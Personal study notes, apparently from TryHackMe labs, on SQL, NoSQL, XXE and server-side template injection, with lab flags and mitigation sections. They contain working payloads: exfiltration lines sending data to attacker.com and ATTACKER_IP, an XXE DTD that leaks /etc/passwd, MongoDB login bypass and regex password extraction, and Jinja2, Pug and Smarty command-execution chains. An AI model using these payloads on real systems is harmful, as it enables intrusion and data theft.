# Advanced SQL Injection 

## Recap

For previous lesson: [[Web Hacking#SQL Fundamentals]]

![[62a7685ca6e7ce005d3f3afe-1716989638556.svg]]

### 1. In-band SQL Injection

Most common and easiest technique. Uses the same channel for injecting and retrieving data.

- **Error-Based SQLi**
    
    - Manipulates queries to generate database error messages.
    - Errors reveal DB structure or version.
    - Example:  
        `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version));`
        
- **Union-Based SQLi**
    
    - Uses `UNION` to combine results of multiple `SELECT` queries.
    - Retrieves data from other tables.
    - Example:  
        `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin;`
    
### 2. Inferential (Blind) SQL Injection

Data is not directly returned; attacker infers information via app behaviour.

- **Boolean-Based Blind SQLi**
    
    - Sends queries that evaluate to true/false.
    - Observes page content or behaviour changes.
    - Example: `1 AND 1=1` (true) vs `1 AND 1=2` (false).
        
- **Time-Based Blind SQLi**
    
    - Uses time delays to infer true/false conditions.
    - Measures server response time.
    - Example:  
        `IF (1=1) WAITFOR DELAY '00:00:05'--`
        
### 3. Out-of-band SQL Injection

Used when data cannot be retrieved via the same channel or responses are unstable.

- Relies on database making external requests (HTTP/DNS).
- Sends results to an attacker-controlled server.
- Less common but very effective.

Q: What type of SQL injection uses the same communication channel for both the injection and data retrieval ? 
A: In-band 

Q: In out-of-band SQL injection, which protocols is usually used to send query results to the attacker's server ? 
A: HTTP 

## Second-Order SQL Injection 

### Definition

- Occurs when user input is **stored** in the database and later **reused** in another SQL query.
    
- Payload does **not** execute at the point of insertion; triggers only on a **later use**.
    
- Harder to detect because input validation often happens **only during initial entry**.

### Why It’s Dangerous

- Bypasses normal front-end validation.
- No errors during initial data entry, so payload looks harmless.
- Activates only when the stored data is processed in a later SQL operation.
- Requires understanding **application data flow and backend logic**.

### Example Scenario (Book Review App)

**Pages:**

- `add.php` → inserts book (SSN, book_name, author)
- `update.php` → retrieves stored values and updates book details


**Insecure pattern**

- `add.php` uses `real_escape_string()` but **not parameterized queries**.
- Stored payload (e.g., in `ssn`, `book_name`, etc.) becomes dangerous when reused.

**Malicious SSN example**

```bash
test`
```

Inserted successfully -> no immediate issue 

**Malicious stored payload example**

```bash
Intro to PHP'; DROP TABLE books;--
```

 - Insert works 
 - Executes later when reused unsafely 


Q: What is the flag value after updating the title of all books to "compromised" ? 
A: THM{SO_HACKED}

Q: What is the flag value once you drop the table hello from the database  ?
A: THM{Table_Dropped}
## Filter Evasion Techniques 

### 1. Character Encoding Techniques

- URL Encoding
- Hexadecimal Encoding
- Unicode Encoding
- `%27` (single quote)
- `%20` (space)
- `%3D` (equals `=`)
- `%2D%2D` (comment `--`)
- `%09` (tab)
- `%0A` (line feed)
- `%0C` (form feed)
- `%0D` (carriage return)
- `%A0` (non-breaking space)
- `encodeURIComponent()`
- `0x…` hex strings
- `\uXXXX` Unicode escapes

### 2. Common Filtered SQL Keywords

- `OR`
- `or`
- `AND`
- `and`
- `UNION`
- `SELECT`

### 3. Alternative Operators / Boolean Logic

- `||` (OR operator)
- `&&` (AND operator)
- `1=1`
- `1'` (string cut)
- `--`
- `--+`

### 4. No-Quote SQL Injection Techniques

- **Numerical payloads** (e.g., `OR 1=1`)
- **Comment-based bypass** (e.g., `admin--`)
- **String building without quotes:**
    
    - `CONCAT()`
    - `CONCAT(0x61,0x64,0x6d,0x69,0x6e)`
    - `CHAR()` representation

### 5. No-Space Injection Techniques

- `/**/` inline comments
- Tabs → `\t`, `%09`
- Newlines → `\n`, `%0A`
- Alternate whitespace → `%0C`, `%0D`, `%A0`
- Keyword splitting:
    
    - `SE/**/LECT`
    - `FR/**/OM`
    - `SE/**/LECT * FROM/**/users`

### 6. Keyword Obfuscation Methods

- Case-variation: `SElEcT`, `UnIoN`
- Inline comment breaking: `SE/**/LECT`
- Function-based building:
    
    - `CONCAT('a','d','m','i','n')`
    - `CHAR(0x61,0x64,0x6D,0x69,0x6E)`
        
- Hex/Unicode equivalents for keywords
    
### Summary 

| **Scenario**                                                 | **Description**                                                                                                  | **Example**                                                                                             |
| ------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **Keywords like SELECT are banned**                          | SQL keywords can often be bypassed by changing their case or adding inline comments to break them up             | SElEcT * FrOm users or SE/**/LECT * FROM/**/users                                                       |
| **Spaces are banned**                                        | Using alternative whitespace characters or comments to replace spaces can help bypass filters.                   | SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users                                               |
| **Logical operators like AND, OR are banned**                | Using alternative logical operators or concatenation to bypass keyword filters.                                  | username = 'admin' && password = 'password' or username = 'admin'/**/\|/**/1=1 --                       |
| **Common keywords like UNION, SELECT are banned**            | Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.                      | SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)                                     |
| **Specific keywords like OR, AND, SELECT, UNION are banned** | Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments. | SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users |

Q: What is the MySQL error code once an invalid query is entered with bad characters ? 
A: 1064

Q: What is the name of the book where book ID=6 ?
A: Animal Series 

Q: Which is the password for the username "attacker" ?
A: tesla

Q: Which of the following can be used if the SELECT keyword is banned ? 
A: a) SElect b)SeLect

## Out-of-band SQL Injection 

### Definition

- Attack method using **separate channels** for sending payload and receiving data.
    
- Used when **in-band** and **blind** SQLi methods are ineffective.
    
- Relies on DB features like **HTTP**, **DNS**, **SMB**, or **system commands** to exfiltrate data.

![[62a7685ca6e7ce005d3f3afe-1717060822273.svg]]


### Why Use OOB

- Direct responses are **restricted or sanitised**.
- DB is behind **firewalls** or **segmented networks**.
- IDS/WAF monitor SQL output but **not DNS/SMB/HTTP**.
- Enables stealthy, persistent exfiltration.
    
### Techniques by Database

#### MySQL / MariaDB

- `SELECT ... INTO OUTFILE`
```sql
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```
- `LOAD_FILE()` when accessible.
- OOB channels: HTTP (via UDF), DNS (via UDF/scripts), SMB

#### Microsoft SQL Server (MSSQL)

- `xp_cmdshell`
```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users"
queryout "\\10.10.58.187\logs\out.txt" -c -T';
```
- `OPENROWSET` , `BULK INSERT`
- Native support for SMB/UNC paths 

#### Oracle

- `UTL_HTTP` for outbound HTTP exfil:
```sql
UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
```
- `UTL_FILE` for writing files 

### Common OOB Techniques

#### 1. HTTP Exfiltration

- Requires UDF or external script in MySQL.
- Example:
```sql
SELECT http_post('http://attacker.com/exfiltrate', sensitive_data)
```

#### 2. DNS Exfiltration

- Encodes data inside DNS lookup queries.
- Often implemented using custom UDFs or system-level scripts.

#### 3. SMB Exfiltration

- Common in Windows; possible in Linux with SMB tools.
- Example:
```sql
SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
```

Q: What is the output of the @@version on the MySQL server ? 
A: 10.4.24-MariaDB

Q: What is the value of the @@basedir variable ? 
A: C:/xampp/mysql 

## Other Techniques 

### 1. HTTP Header Injection

#### Key Idea

- User-controlled HTTP headers (User-Agent, Referer, X-Forwarded-For) can be logged or used inside SQL queries.
    
- If unsanitised, they become injection points.
    

#### Example Vulnerable Flow

1. Application reads HTTP header (e.g., `User-Agent`).
2. Header value is inserted directly into DB:
```sql
INSERT INTO logs (user_Agent) VALUES ('$userAgent')
```
3. Same header is used in a SELECT query without sanitisation: 
```sql
SELECT * FROM logs WHERE user_Agent = '$userAgent'
```

#### Payload example 

```sql
' UNION SELECT username, password FROM user; #
```

- `'` closes string
- `UNION SELECT` - extracts data 
- `#` comments out rest

#### Curl Injection example : 

```bash
curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://MACHINE_IP/httpagent/
```

### 2. Stored Procedure Injection

#### Concept

- Stored procedures are precompiled routines.
- When they build dynamic SQL via string concatenation, they become injectable.

### Vulnerable Stored Procedure Example

```sql
CREATE PROCEDURE sp_getUserData
  @username NVARCHAR(50)
AS
BEGIN
  DECLARE @sql NVARCHAR(4000)
  SET @sql = 'SELECT * FROM users WHERE username=''' + @username + ''''
  EXEC(@sql)
END
```
- `@username` is concatenated directly - Injection point 

#### Attack Surface

- Stored procedures that:
    
    - build dynamic SQL
    - accept user parameters
    - lack sanitisation or parameterisation
    
### 3. XML and JSON SQL Injection

#### Concept

- Applications parse XML or JSON, then use parsed values in SQL queries.
- If the parsed value is directly inserted into SQL → injection.

#### JSON Payload Example

```json
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```

#### Vulnerable SQL Query 

```sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1'--'
AND password = 'password'
```

Q: What is the value of the flag field in the books table where book_id = 1 ? 
A: THM{HELLO}

Q: What field is detected on the server side when extracting the user agent from the HTTP request ? 
A: User-Agent 

## Automation 

### Major Issues During Identification

#### 1. Dynamic Nature of SQL Queries

- Queries are often built dynamically.
- Multiple logic layers can hide injection points. 
- Harder for automated tools to track tainted data flow.

#### 2. Variety of Injection Points

- Inputs: form fields, headers, cookies, URL parameters.
- Requires thorough coverage of all request components.

#### 3. Use of Security Measures

- Prepared statements, parameterised queries, ORM frameworks.
- Tools must detect whether a query is safe or vulnerable.

#### 4. Context-Specific Detection

- Injection depends on query context (string, numeric, logic, etc.).
- Tools need to adapt payloads based on context.
    
### Important Tools for Automated SQL Injection

#### 1. SQLMap

- Open-source automation tool.
- Detects and exploits SQL injection in web apps.
- Supports multiple DBMS.
- Extensive options for fingerprinting & exploitation.

#### 2. SQLNinja

- Designed for SQL injection targeting **MSSQL**.
- Automates database fingerprinting and data extraction.

#### 3. JSQL Injection

- Java-based SQL injection detection library.
- Supports multiple injection types.
- Helps extract data or gain DB control.

#### 4. BBQSQL

- Blind SQL injection exploitation framework.
- Efficient for automating blind SQLi payloads.

Q: Does the dynamic nature of SQL queries assist a pentester in identifying SQL injection (yea/nay) ? 
A: nay 

## Best Practices 

## Secure Coders 

#### 1. Parameterised Queries & Prepared Statements

- Separate SQL structure from data.
- Prevents user input from being executed as code.
- Example (PHP PDO):
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```
#### 2. Input Validation & Sanitisation

- Validate type, length, range, and format.
- Reject inputs outside expected patterns.
- Use built-in sanitisation functions:
    
    - `htmlspecialchars()`
    - `filter_var()`
    
#### 3. Least Privilege Principle

- Give DB accounts only necessary permissions.
- Avoid admin-level DB accounts for normal operations.
- Reduces impact of successful SQL injection.

#### 4. Stored Procedures

- Encapsulate SQL logic inside the database.
- Accept validated inputs only.
- Ensure stored procedures handle sanitisation.

#### 5. Regular Security Audits & Code Reviews

- Combine automated scanning with manual review.
- Identify subtle issues that tools miss.
- Keep security practices aligned with evolving threats.

### Pentesters
#### 1. Exploiting Database-Specific Features

- DBMS-specific knowledge: MySQL, PostgreSQL, Oracle, MSSQL.
- Example: MSSQL → `xp_cmdshell` for OS command execution.

#### 2. Leveraging Error Messages

- Trigger verbose SQL errors to gain insight.
- Example:
```sql
1' AND 1=CONVERT(int, (SELECT @@version)) --
```

#### 3. Bypassing WAF & Filters

- Techniques:
    
    - Mixed case: `SeLeCt`
    - Encoding: hex, URL encoding
    - Concatenation: `CONCAT(CHAR(83), CHAR(69), ...)`
    - Inline comments: `/**/`
    - Alternate whitespace: `%09`, `%0A`

#### 4. Database Fingerprinting

- Identify DB type/version to tailor payloads.
- Examples:
    
    - PostgreSQL → `SELECT version()`
    - MySQL/MSSQL → `SELECT @@version`

#### 5. Pivoting with SQL Injection

- Use DB access to move deeper into the network 
- Extract credentials, abuse trust relationships.
- Expand access beyond the original injection point.


Q: What command does MSSQL support to execute system commands ? 
A: xp_cmdshell


# NoSQL Injection 

## What is NoSQL 

### MongoDB Overview

- MongoDB is a NoSQL database used to store data in an ordered, structured format.
    
- Unlike relational databases (MySQL, MariaDB, PostgreSQL), MongoDB **does not use tables**.
    
- Data is stored in **documents**, not rows.

### Document Structure

- Documents are associative arrays / dictionaries (key-value format).
- Example document:
```css
{
  "_id": ObjectId("5f077332de2cdf808d26cd74"),
  "username": "lphillips",
  "first_name": "Logan",
  "last_name": "Phillips",
  "age": "65",
  "email": "lphillips@example.com"
}
```

### Collections

- A **collection** groups similar documents.
- Equivalent to tables in relational databases.
- Example: All employee documents stored under the **people** collection.
### Databases

- The highest hierarchy level.
- Group multiple related collections.

### Querying in MongoDB (NoSQL Structure)

MongoDB queries use structured associative arrays for filtering — similar to SQL WHERE conditions.

### Simple Filters

**Filter by last name:**
```css
['last_name' => 'Sandler']
```
-> Returns documents with last_name = Sandler 

### MongoDB Operators

- Operators allow creation of complex nested filters.
- Example shown: `$lt` (less than).
- A full reference is available in MongoDB Operator Documentation.

Q: What is a group of documents in MongoDB is known as ? 
A: Collection

Q: Using the MongoDB Operator Reference, what operator is used to filter data when a field isn't equal to a given value ? 
A: $ne 

Q: Following the example of the 3 documents given before, how many documents would be returned by the following filter: : \[gender' => \['\$ne' => 'female'] , 'age' => \['$gt'=>'65'] ]?
A: 0

## NoSQL Injection 

- All injection attacks share the same root cause:  
    **Untrusted user input is concatenated into a command/query**, allowing the attacker to alter its meaning.
    
- SQL injection uses quotes (`'` or `"` ) to break out of the query.
    
- NoSQL injection works the same conceptually — altering the query by injecting unexpected structures or operators.
    
### Two Main Types of NoSQL Injection

#### 1. Syntax Injection

- Similar to SQL injection.
- Attacker breaks out of the query structure and injects arbitrary syntax.
- Less common because libraries often sanitize syntax-related characters.

#### 2. Operator Injection

- Most common NoSQL injection type.
- Even if the attacker cannot escape the query, they can inject **NoSQL operators** (like `$ne`, `$gt`, `$or`, etc.).
- Allows manipulation of query behaviour → can lead to **authentication bypass**, privilege escalation, enumeration.

####  Why Operator Injection Works

- NoSQL queries use **nested associative arrays**, not string concatenation.
    
- If user input is inserted into the array directly, the attacker can submit input that transforms the value into **another array**, containing operator expressions.

#### Injecting Arrays into NoSQL Queries

- Many server-side languages (including PHP) allow arrays to be passed via request parameters using special syntax.
    
- In HTTP requests, arrays can be passed like:
```bash
user[$ne]=xxxx&pass[$ne]=yyyy
```
- This converts into: 
```php
$_POST['user'] = ['$ne' => 'xxxx'];
```

### Operator Injection - Authentication Bypass 

**payload** : 
```bash
user[$ne]=xxxx
pass[$ne]=yyyy
```

**Injected filter becomes**: 

```bash
[
  'username' => ['$ne' => 'xxxx'],
  'password' => ['$ne' => 'yyyy']
]
```

### Result

- Database returns **the first document where username != xxxx AND password != yyyy**.
- Usually returns **all accounts**.
- Application sees a matching record → login bypass → attacker is authenticated as the first user returned.

### Why This Works

- MongoDB interprets `$ne` (not equal) as valid operator.
- The application trusts the returned document and logs the attacker in.
- No parameter validation + operator support = critical flaw.

Q: What type of NoSQL Injection is similar to normal SQL Injection ?
A: Syntax

Q: What type of NoSQL Injection allows you to modify the behaviour of the query, even if you can't escape the syntax ? 
A: Operator 

Q: When bypassing the login screen suing $ne operator, what is the email of the user that you are logged in as ? 
A: admin@nosql.int
## Operator Injection 

### 1. Logging in as Other Users Using `$nin`

#### Purpose

- The previous `$ne` bypass logs you in only as _the first document_ returned by MongoDB.
    
- To choose _which_ user you impersonate, you can use `$nin`.

#### How `$nin` Works

- `$nin` = “not in list”.
- Allows you to exclude specific users so you log in as another one.
#### Example: Login as Any User Except Admin

**Attacker Payload (POST Format)**

```bash
user[$nin][]=admin
pass[$ne]=aweasdf
```

**Resulting Filter**
```bash
[
  'username' => ['$nin' => ['admin']],
  'password' => ['$ne' => 'aweasdf']
]
```

**Outcome**

- Returns **any user whose username is NOT admin**.
- Application logs attacker in as the _first non-admin_ user.

#### Expanding the `$nin` list 

Attackers can exclude multiple users : 

**Payload**
```bash
user[$nin][]=admin&user[$nin][]=jude
pass[$ne]=aweasdf
```

**Filter**

```bash
[
  'username' => ['$nin' => ['admin', 'jude']],
  'password' => ['$ne' => 'aweasdf']
]
```

**Outcome**

- Exclude more users → rotate through remaining accounts.    
- Repeat to access all available accounts.
### 2. Extracting Users’ Passwords with `$regex`

This resembles a **blind guessing (hangman-style)** attack.
#### Step 1 — Determine Password Length

**Payload Concept**

Check whether password matches a regex of length N:
```powershell
password[$regex]=^.{7}$
username=admin
```

 **Interpretation**

- `^.{7}$` → any 7-character string.    
- If login fails → password ≠ 7 chars.
- Repeat with different lengths until success.

 **Outcome**

- Attacker finds correct password length (example: length = 5).


#### Step 2 — Identify Each Character (Brute-Force Regex)

**Regex Format for First Character**
```powershell
password[$regex]=^c....$
```

- Checking if first character = `c`.
- If login fails → first character ≠ c.
- Iterate through alphabet, digits, symbols.

**Successful Match Example**

```powershell
password[$regex]=^a....$
```

→ Server responds differently → confirms first letter = `a`.

 **Process**

- Repeat for positions 2, 3, 4, and 5:
    
    - `^.a...$`       
    - `^..x..$`
    - `^...m.$`
    - `^....t$`

**Result**

- Full password is extracted character by character.

Q: How many users are there in total ? 
A: 4

Q: There is a user that starts with the letter "p". What is the username ? 
A: pedro 

Q: What is john's password ? 
A: 10584312

Q: One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag !
A: flag{N0Sql_n01iF3!}

## Syntax Injection 

### 1. Detecting Syntax Injection

**Initial Test**

- Inject a single `'` character.
- Server throws an error due to broken JavaScript syntax inside a `$where` clause.
    
**Error Snippet Showing Vulnerability**

```bash
for x in mycol.find({"$where": "this.username == '" + username + "'"}) 
```

- User input (`username`) is concatenated directly into a JavaScript string.
- `$where` executes JavaScript, enabling full syntax manipulation.
    
### 2. Behaviour-Based Testing (Even Without Verbose Errors)

**False Condition Test**

```pgsql
admin' && 0 && 'x
```
-> No result returned 

**True Condition Test**

```pgsql
admin' && 1 && 'x
```
-> Returns matching email : `admin@nosql.int`

- Confirms the attacker can inject JavaScript boolean conditions.
- Validates Syntax Injection even without stack traces.
### 3. Exploiting Syntax Injection to Dump Data

**Goal**

- Force condition to always evaluate to **true**    
- Useful for data extraction (e.g., all emails).

**Payload**

```sql
admin'||1||'
```

 **Reason**

- In JavaScript executed via `$where`, `1` always evaluates to true.
- `'||1||'` breaks out of the original logic and ensures a true condition.

**Result**

- Full data disclosure via `$where` JavaScript execution.
    
### 4. The Exception to the Rule (Why Syntax Injection Is Rare)

- Syntax Injection only occurs when developers use **custom JavaScript queries** via:
    
    - `$where`
    - `mapReduce`
    - `runCommand` with JavaScript
    - Developers rarely need `$where` for normal queries. 
	- Therefore, Syntax Injection exists but is **much less common** than Operator Injection.

Q: What common character is used to test for injection in both SQL and NoSQL solutions ? 
A: '

Q: What is the email value of the super secret user returned in the last entry ? 
A: `Syntax@Injection.FTW`


# XXE Injection 

## XML
- **XML (Extensible Markup Language)**: A markup language derived from SGML (Standard Generalized Markup Language) used to store and transport structured, human- and machine-readable data.
    
- **Structure**: Built with elements, attributes, and character data. Uses tags like `<tag></tag>`.
    
- **Usage**: Data exchange (APIs, SOAP), configuration files, and system-to-system communication.
## XSLT

- **XSLT (Extensible Stylesheet Language Transformations)**: Used to transform XML documents.
    
- **Relevance to XXE**:
    
    - Can extract data
    - Can expand internal/external entities
    - Enables data manipulation
    - Supports blind XXE payloads

## DTDs (Document Type Definitions)

- **Purpose**: Define XML structure, allowed elements, attributes, and validation rules.
    
- **Types**:
    
    - **Internal DTD**: Defined inside the XML.
        
    - **External DTD**: Loaded from an external file or URL.
        
- **Security Impact**: External entities in DTDs enable **XXE attacks**.
    
## XML Entities

- **Internal Entity**: Defined in DTD, used as variables inside XML.
    
- **External Entity**: Loads content from a file/URL — core of XXE vulnerabilities.
    
- **Parameter Entity**: Used within DTDs (e.g., modularizing DTD structure).
    
- **General Entity**: Substitution inside XML content.
    
- **Character Entities**: Represent special characters (`&lt; &gt; &amp;`).

![[645b19f5d5848d004ab9c9e2-1716545852309.png]]

Q: What is the meaning of the acronym SGML ? 
A: Standard Generalized Markup Language 

Q: What is the meaning of the acronym DTD ? 
A: Document Type Definitions 

## XML Parsing Mechanisms 

- **XML parsing** is the process of **reading XML** and converting it into a usable structure (e.g., DOM tree).
    
- Parsers may validate XML against **DTDs or schemas**.
    
- If external entities are enabled, parsing can expose systems to **XXE** attacks (file access, SSRF, internal network access).

## Common XML Parsers

- **DOM Parser**: Loads the entire XML into memory as a tree; flexible but memory-heavy.
    
- **SAX Parser (Simple API for XML)**: Event-based, sequential parsing; efficient for large files; no random access.
    
- **StAX Parser(Streaming API for XML)**: Streaming parser like SAX but allows developer-controlled pull parsing.
    
- **XPath Parser**: Extracts data via XPath expressions; often used with XSLT.

Q: What XML parser builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document ? 
A: DOM Parser 

## Exploiting XXE - In-Band 

**In-Band XXE**:

- Attacker receives the server’s response directly.
- Data exfiltration is visible in the HTTP response.
- Simple to exploit.

![[734c868f5e54ae3b3d0c3539301f2256.png]]

XML payload for XXE (In-Band) attack : 

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

![[734c868f5e54ae3b3d0c3539301f2256 1.png]]

### XML Entity Expansion

- Technique where declared XML entities are expanded during parsing.
    
- Can be abused to cause:
    
    - **DoS** (e.g., Billion Laughs attack via recursive expansion).
    - **XXE** using external entities referencing internal files or services.
        
- Core mechanism enabling both in-band and OOB XXE attacks.

Q: What XXE vulnerability occurs when the server's response is immediately disclosed to the attacker without the use of external channels ? 
A: In-Band XXE 

Q: What is the content of the file 14232d6db2b5fd937aa92e8b3c48d958.txt in the /opt directory ? 
A: THM\{1N_b4Nd_1$\_34sYY}


## Exploiting XXE - Out-of-Band

 **Out-of-Band (OOB) XXE**:
 
- Attacker cannot see server responses
- Requires external channels (DNS/HTTP callbacks) for exfiltration.
- Used when responses are not returned to the attacker.

Normal XXE OOB payload 

```xml 
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

For Extracting data : 

 - Create a DTD file with payload : 

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

- Sends this payload with request

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

Which will make request to attacker IP with the data 


## SSRF + XXE 

 **SSRF via XXE**

- **Server-Side Request Forgery (SSRF)** occurs when an attacker tricks the server into making unintended requests.
    
- In XXE, malicious external entities can force the XML parser to request internal files or URLs.
    
- This allows attackers to access internal endpoints, metadata services, or restricted resources.

 **Internal Network Scanning**

- XXE-based SSRF can probe internal systems by making the server send requests to internal hosts/ports.
    
- Useful for discovering internal services running on non-standard ports or not exposed externally.

payload for **internal scanning** : 

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:10/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

then try different **port numbers** and analyze **difference in response** 

Q: What is the flag in the application running internally ? 
A: THM{0O8_xx3!!}

Q: What port is the internal application hosted on ?  
A: 81

## Mitigation 


## General Best Practices

- Disable **external entities** and **DTDs** in all XML parsers.
- Prefer simple formats like **JSON** when possible.
- Validate input via strict schemas; avoid/escape `<`, `>`, `&`, `'`, `"`.
## Language-Specific Mitigations

**Java**

- Disable DOCTYPE and external entities in `DocumentBuilderFactory`.
- Turn off `XInclude` and entity expansion.
    

**.NET**

- Set `DtdProcessing = Prohibit`.
- Set `XmlResolver = null`.
    

**PHP**

- Disable external entity loading: `libxml_disable_entity_loader(true)`.
    

**Python**

- Use **defusedxml** (secure XML parsing).

## Operational Practices

- Keep XML libraries and parsers **updated** and patched.
- Perform **code reviews** focusing on XML-handling logic.
- Train developers on secure XML parsing and XXE risks.

# Server-Side Template Injection 

 **Server-Side Template Injection (SSTI)**

- SSTI occurs when **user input is injected into server-side templates** and processed as executable template code.
    
- Caused by unsafe handling of dynamic data inside template engines.
    
- Allows attackers to run arbitrary server-side logic.
### Core Concepts

- **Dynamic Content Generation**: Templates combine static HTML with dynamic data.
    
- **Input as Template Code**: If user input becomes part of the template syntax, it can execute malicious expressions.
    
### SSTI Attack Flow

- Unvalidated user input reaches the template engine.
- Payload is interpreted as template code.
- Potential impact:
    
    - File read/write
    - Command execution
    - Access to environment variables and credentials
    - Full remote code execution (RCE)

## Template Engines 

- Template engines generate dynamic HTML by combining static templates with runtime data.
    
- Templates contain **placeholders** (e.g., `{{ name }}`) replaced by actual values during rendering.
    
- Most engines support expressions or logic, which becomes a risk when user input is processed unsafely.

### SSTI Context

- When user-controlled input is interpreted as **template code**, attackers can execute expressions or commands.
    
- Root cause: unsanitized user input inserted into server-side templates.
### Common Template Engines

- **Jinja2 (Python)** – Feature-rich, powerful expression handling.
    
- **Twig (PHP)** – Secure defaults, Jinja-like syntax.
    
- **Pug/Jade (Node.js)** – Uses minimal syntax and supports JS expression evaluation.
    
### Template Engine Parsing

- Engine parses template → identifies dynamic placeholders → replaces them with runtime data.
    
- Example (Jinja2):
  ```python
  Template("Hello, {{ name }}!").render(name="World")
  ```

### Detecting Template Engines 

- **Jinja2 vs Twig**:
    
    - `{{7*'7'}}` → `7777777` (Jinja2)
    - `{{7*'7'}}` → `49` (Twig)
        
- **Pug/Jade**:
    
    - `#{7*7}` → `49` (JS evaluation)
    - Supports direct JavaScript execution inside templates.

## PHP - Smarty 

## Smarty (PHP Template Engine)

- Smarty separates display logic from business logic but supports executing **PHP functions inside templates**, which introduces SSTI risk.
    
- If misconfigured, attackers can execute PHP code through template variables, modifiers, or function calls.
    
### Exploitation Steps

1. **Identify Smarty**
    
    - Test with: `{'Hello'|upper}`
    - Output `"HELLO"` confirms Smarty processing.
        
2. **Exploit SSTI**
    
    - If PHP execution is allowed, use functions like `system()` for command execution.
    - Example payload:
    ```perl
    {system("ls")}
    ```
    - Smarty will run the OS command and return the output (e.g., directory listing).

Q: What is the content of the hidden text file in the server directory ?
A: THM{0739eea78f5c7f4b1690737c6258e38b}

## NodeJS - Pug 

- Pug is a Node.js template engine that supports **direct JavaScript execution** inside templates.
- Vulnerable when **user input is interpolated** without sanitization.
- Dangerous constructs: `#{}` (JS interpolation) and unescaped `!{}`.

### Key Vulnerability Points

- **JavaScript Interpolation**: `#{ user_input }` → executes JS if input is unsanitized.
    
- **Default Escaping** exists but does not protect against JS execution or unescaped interpolation.
    
### Detection

- Test interpolation: `#{7*7}` → output `49` confirms Pug template evaluation.

```nodejs
#{root.process.mainModule
   .require('child_process')
   .spawnSync('ls').stdout}
```

Executes system commands via `child_process.spawnSync`.

### spawnSync Notes

- `spawnSync('ls -lah')` fails because the entire string is treated as one command.
- Correct usage:
### Exploitation (Command Execution)

- Pug templates can access Node.js internals:
```
spawnSync('ls', ['-lah'])

#{root.process.mainModule.require('child_process')
  .spawnSync('ls', ['-lah']).stdout}

```

Q: What is the content of the hidden text file in the server directory ? 
A: THM{1f8c3b32ad3217e84c145398bae00876}

## Python - Jinja2


- Jinja2 is a Python template engine that supports Python-like expressions inside `{{ }}`.
    
- Vulnerable when **user input is embedded directly into templates**, allowing arbitrary Python code execution.

### Key Vulnerability Points

- **Expression Evaluation**: `{{ payload }}` can execute Python expressions.
- **Template Features**: Inheritance, imports, and macros can expose additional attack surfaces.

### Detection

- Test with: `{{7*7}}` → output `49` confirms Jinja2 execution.
-
### Exploitation (Command Execution)

- Jinja2 gives access to Python object internals:
```csharp
{{"".__class__.__mro__[1].__subclasses__()[157]
    .__repr__.__globals__.get("__builtins__")
    .get("__import__")("subprocess")
    .check_output("ls")}}
```

Traverses Python class hierarchy → imports `subprocess` → runs commands.

### check_output 

- `check_output('ls -lah')` fails because the string is treated as one command.
- Correct usage requires **command + args as a list**:
```csharp
subprocess.check_output(['ls', '-lah'])

{{"".__class__.__mro__[1].__subclasses__()[157]
    .__repr__.__globals__.get("__builtins__")
    .get("__import__")("subprocess")
    .check_output(['ls','-lah'])}}

```

Q: What is the content of the hidden text file in the server directory ? 
A: THM{ecc43642dd6934d37c69598174e6e126}


## Automating the Exploitation 


### SSTImap – Overview

- SSTImap is an automated tool for **detecting and exploiting** Server-Side Template Injection (SSTI) vulnerabilities.
    
- Supports multiple template engines and automates tailored payload generation.
    
### Setup
    
- Manual installation:
```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt
```

### Capabilities

- **Template Engine Detection** – Identifies Jinja2, Twig, Mako, Smarty, Pug, etc.
    
- **Automated Exploitation** – Runs engine-specific payloads to verify or exploit SSTI.

**Basic Usage Example** : `python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
`

## Extra-Mile Challenge 

Q: What is the content of the hidden text file in the server directory ? 
A: THM{w0rK1Ng_sST1}

## Mitigations 

### SSTI Mitigation 

#### Jinja2

- **Sandbox Mode**: Use `SandboxedEnvironment` to restrict unsafe functions and attribute access.
    
- **Input Sanitization**: Escape or validate all user input before inserting it into templates.
    
- **Template Auditing**: Review templates for unsafe patterns (e.g., direct user input in `{{ }}`).
    
#### Pug (Jade)

- **Avoid JS Evaluation**: Limit use of `#{}` and avoid unescaped `!{}` when rendering user data.
    
- **Validate/Sanitize Inputs**: Ensure user data is strictly validated before rendering.
    
